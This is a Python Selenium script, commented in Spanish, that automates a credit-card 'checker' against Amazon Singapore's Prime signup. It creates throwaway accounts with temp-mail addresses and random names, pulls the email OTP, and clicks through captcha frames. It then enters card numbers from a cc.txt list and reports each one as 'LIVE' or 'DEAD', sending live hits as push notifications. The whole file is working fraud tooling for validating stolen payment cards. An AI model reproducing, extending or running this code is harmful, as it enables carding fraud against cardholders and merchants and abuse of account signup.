from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from time import sleep
import threading
from notify_run import Notify
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support.ui import Select
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from colorama import *
from playsound import playsound
from selenium.common.exceptions import *
import random
import requests
import re
import names
import sys

class Chek:
    



    def __init__(self):

        init()      # Inicializa todos las referencias como paquetes
        #sys.tracebacklimit = 0     #Manejo de excepciones
        
        try:
        
            #Carga el archivo cc.txt
            self.ccs = open("cc.txt", "r+").readlines()
            self.indice_ultima = len(self.ccs) - 1

            self.webdriver_chromeoptions()   #Carga las opciones del navegador y retorna las opciones

            self.__browser221 = webdriver.Chrome('chromedriver', options=self.chrome_options)   #Crea la interfaz con las opciones
            self.__browser221.get("https://tempm.com/hasevo.com") #Carga la web
            self.tempmail()  #Extrae datos del mail

            self.__driver = webdriver.Chrome('chromedriver', options=self.chrome_options)   #Crea interfaz con las opciones
            self.__driver.get("https://www.amazon.sg/gp/prime/pipeline/membersignup")  #Carga la web 
            self.nerro = 0          #Contador de errores que se usa en self.error_register()
            self.registroamazon()    #Se registra en amazon

            self.crearlinea()    #Toma una linea de cc.txt

        except WebDriverException:
            print(Fore.RED, "Error al conectar a la red")
        

    #Crea el Email
    def tempmail(self):

        self.__browser221.implicitly_wait(30)  #Espera 30 segundos o hasta que cargue

        mailll = self.__browser221.find_element_by_id("userName")
        tempmail1 = mailll.get_attribute("value")
        self.correitotemp = tempmail1+"@hasevo.com"
        print("CREATING EMAIL  ...")

    #Separa los datos de la cc
    def crearlinea(self):

        file = [s.rstrip() for s in self.ccs]
        for lines in file:
            cc = lines.split("|")
            self.cc1 = cc[0]
            self.mes = cc[1] 
            self.anio = cc[2]
            self.cvv = cc[3]

    def remover_ultima(self):

        self.ccs.pop(self.indice_ultima)
        self.indice_ultima -= 1

    def generargmail(self, email):

        x = random.randint(1, 200000)
        email1 = email.split("@")
        email2 = email1[0] + "+" + str(x) + "@" + email1[1]
        print(Fore.GREEN + email2)

    def pagar(self):
        self.__driver.find_element(By.XPATH, '//*[@id="a-autoid-0"]/span/input').click()
        timer1 = threading.Timer(4, self.verificar)     
        timer1.start()
    def recheck(self):
        self.__driver.find_element_by_css_selector(".pmts-link-button[value='Change']").click()
        sleep(2)
        element = self.__driver.find_element(By.CLASS_NAME, 'a-size-base')
        element.click()
        timer4 = threading.Timer(5, self.refill)
        timer4.start()
    def buttonsfill(self):
        self.__driver.find_element(By.NAME, 'ppw-widgetEvent:SelectAddressEvent').click()
        sleep(3)
        self.__driver.find_element(By.NAME, 'ppw-widgetEvent:PreferencePaymentOptionSelectionEvent').click()
        timer3 = threading.Timer(3, self.pagar)
        timer3.start()
    def refill(self):
        self.__driver.find_element(By.NAME, 'ppw-accountHolderName').send_keys("Josesito deowowowo")
        self.__driver.find_element(By.NAME, 'addCreditCardNumber').send_keys(self.cc1)
        self.__driver.find_element(By.NAME, 'ppw-expirationDate_month').send_keys(self.mes)
        self.__driver.find_element(By.NAME, 'ppw-expirationDate_year').send_keys(self.anio)
        self.__driver.find_element(By.NAME, 'ppw-widgetEvent:AddCreditCardEvent').click()
        timer5 = threading.Timer(3, self.buttonsfill)
        timer5.start()
    def verificar(self):
        bodyText = self.__driver.find_element_by_tag_name('body').text
        if "There was an error validating your payment method. Please update or add a new payment method and try again." in bodyText:
            print(Fore.RED + " DEAD " + self.cc1 +"|"+ self.mes +"|"+self.anio +"|" + self.cvv )
            self.remover_ultima()
            self.crearlinea()
            timer2 = threading.Timer(4, self.recheck)
            timer2.start()
        elif "You can now enjoy FREE delivery on millions of Prime eligible items, strself.eam thousands of movies and TV episodes on Prime Video, get free in game content with Twitch Prime and more." in bodyText:
            playsound('HIT.wav')
            print(Fore.GREEN + " LIVE " + self.cc1 +"|"+ self.mes +"|"+self.anio +"|" + self.cvv )
            notify = Notify()
            notify.send(" LIVE " + self.cc1 +"|"+ self.mes +"|"+self.anio +"|" + self.cvv) 
            

    def fillcc1(self):
        #DATACC
        self.__driver.find_element(By.NAME, 'ppw-accountHolderName').send_keys("Josesito deowowowo")
        self.__driver.find_element(By.NAME, 'addCreditCardNumber').send_keys(self.cc1)
        self.__driver.find_element(By.NAME, 'ppw-expirationDate_month').send_keys(self.mes)
        self.__driver.find_element(By.NAME, 'ppw-expirationDate_year').send_keys(self.anio)
        self.__driver.find_element(By.NAME, 'ppw-widgetEvent:AddCreditCardEvent').click()
        print(Fore.BLUE +"ADDING CC")
        timer7 = threading.Timer(4, self.filladress)
        timer7.start()

    def filladress(self):
    #DATA ADRESS AND PAY
        self.__driver.find_element(By.NAME, 'address-ui-widgets-enterAddressFullName').send_keys("Josesito deowowowo")
        self.__driver.find_element(By.NAME, 'address-ui-widgets-enterAddressPhoneNumber').send_keys("63682066")
        self.__driver.find_element(By.NAME, 'address-ui-widgets-enterAddressPostalCode').send_keys("757724")
        self.__driver.find_element(By.NAME, 'address-ui-widgets-enterAddressLine1').send_keys("1 Woodlands Industrial Park E1 #03-02")
        self.__driver.find_element(By.NAME, 'ppw-widgetEvent:AddAddressEvent').click()
        print(Fore.BLUE + "ADDING ADDRESS")
        self.pagar()

    #-------------------------------------------------------------------------------------
    #-------------------------------------------------------------------------------------
    #-------------------------------------------------------------------------------------

    def otpcode(self):
        
        codiguito = self.__browser221.find_element_by_class_name("otp")
        codiguito2 = codiguito.text
        print(Fore.CYAN +"OTP SOLVED: ")
        self.__driver.find_element(By.NAME, 'code').send_keys(codiguito2)
        self.__driver.find_element(By.CLASS_NAME, 'a-button-input').click()
        self.__browser221.quit()

        WebDriverWait(self.__driver, 120).until(EC.presence_of_element_located((By.ID, "twotabsearchtextbox")))
        
    def error_register(self):

        bodyText0 = self.__driver.find_element_by_tag_name('body').text

        #Lee los mensajes de erro y si no hay pasa al otp
        if "Internal Error. Please try again later." in bodyText0:
            if self.nerro == 3:
                print(Fore.RED, "Error al llenar el formulario")
                return False
            else:
                self.nerro += 1
                print(Fore.RED + "CAMBIAR CORREO")
                self.__browser221.get("https://tempm.com/hasevo.com") #Carga la web
                self.tempmail()  #Extrae datos del mail
                self.__driver.get("https://www.amazon.sg/gp/prime/pipeline/membersignup")
                self.registroamazon()
        elif "Solve this puzzle to protect your account" in bodyText0:
            print(Fore.YELLOW + "CAPTCHA FOUND, NEXT TIME CHANGE IP")
            print(Fore.BLUE + "WAIT UNTIL CAPTCHA SOLVED")
            return True
        elif "Verify email address" in bodyText0: 
            try:
                timer6 = threading.Timer(5, self.otpcode())
                timer6.start()
            except:
                return False
            return True

        else:
            sleep(3)
            self.error_register()
        

    def registroamazon(self):

        print(Fore.CYAN +"SIGNING UP ACCOUNT ")
        self.__driver.implicitly_wait(30)  #Delay

        #Click para registrarse
        self.__driver.find_element(By.XPATH, '//*[@id="createAccountSubmit"]').click()

        #Llena el formulario de registro
        self.__driver.find_element(By.NAME, 'customerName').send_keys(names.get_full_name())
        self.__driver.find_element(By.NAME, 'email').send_keys(self.correitotemp)
        self.__driver.find_element(By.NAME, 'password').send_keys("ColombiaSOS2021")
        self.__driver.find_element(By.NAME, 'passwordCheck').send_keys("ColombiaSOS2021")
        self.__driver.find_element(By.XPATH, '//*[@id="continue"]').click()

        #espera a que cargue la ventana de captcha
        self.__driver.implicitly_wait(10)
        er = self.error_register()    #Revisa si hay errores en el formulario
        if er != False:
            # Cambia el foco al iframe
            self.__driver.switch_to.frame(self.__driver.find_element_by_xpath('//*[@id="cvf-arkose-frame"]'))     #Primer frame
            self.__driver.switch_to.frame(self.__driver.find_element_by_xpath('//*[@id="fc-iframe-wrap"]'))       #Segundo frame
            self.__driver.switch_to.frame(self.__driver.find_element_by_xpath('//*[@id="CaptchaFrame"]'))         #Tercer frame
            # Ahora podemos hacer clic en el botón'
            self.__driver.find_element(By.XPATH, '//*[@id="home_children_button"]').click()
            self.__driver.switch_to.default_content()
            
            #Espera respuestas al aceptar el captcha
            WebDriverWait(self.__driver, 120).until(EC.presence_of_element_located((By.ID, "cvf-input-code")))
            er = self.error_register()    #Revisa si hay errores en el formulario
            if er != False:

                pass
            
            else:
                print(Fore.RED, "Tiempo de espera de OTP number extendido")

    def webdriver_chromeoptions(self):
        #Inica el API WEBDRIVER CHROME para ajustar las opciones
        self.chrome_options = webdriver.ChromeOptions()
        
        # Agrega los opciones del navegador
        self.chrome_options.add_argument('--ignore-certificate-errors')
        self.chrome_options.add_argument("--disable-extensions")
        self.chrome_options.add_argument("--disable-gpu")
        self.chrome_options.add_argument('--no-sandbox')
        self.chrome_options.add_argument('--incognito')
        self.chrome_options.add_argument('--disable-dev-shm-usage')
        #self.chrome_options.add_argument("--headless")                  #Ocultar navegador
        self.chrome_options.add_argument("--window-size=800,600")
        self.chrome_options.add_argument("--disable-infobars")
        self.chrome_options.add_argument("--disable-popup-blocking")


#-------------------------------------------------------------------------------------
#-------------------------------------------------------------------------------------
#-------------------------------------------------------------------------------------

# main 
checker = Chek()